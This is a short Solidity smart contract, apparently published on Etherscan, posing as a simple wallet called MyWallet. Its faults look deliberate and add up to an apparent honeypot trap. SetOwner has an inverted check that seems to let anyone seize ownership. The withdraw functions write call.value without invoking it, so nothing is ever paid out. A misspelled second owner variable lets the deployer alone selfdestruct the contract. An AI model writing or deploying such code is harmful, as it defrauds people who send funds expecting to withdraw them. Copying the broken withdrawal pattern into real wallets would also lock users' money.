/**
 *Submitted for verification at Etherscan.io on 2024-12-28
*/

pragma solidity ^0.4.22;

contract Ownable{
    address internal onwer;
    function Ownable() public {
        onwer = msg.sender;
    }
}

contract MyWallet is Ownable {

    address public owner;

    function MyWallet() public {
        owner = msg.sender;
    }
    
    function SetOwner() public {
        require(owner != address(0), "owner already exists");
        owner = msg.sender;
    }

    function Deposit() public payable {}

    function WithdrawAmount(uint256 amount) public payable {
        require(owner == msg.sender, "not owner");
        address to = msg.sender;
        // Transfer
        to.call.value(amount);
    }

    function WithdrawAll() public payable {
        require(owner == msg.sender, "not owner");
        uint256 balance = address(this).balance;
        address to = msg.sender;
        // Transfer
        to.call.value(balance);
    }

    function TerminateWallet() public {
        require(msg.sender == onwer, "not owner");
        selfdestruct(owner); 
    }

}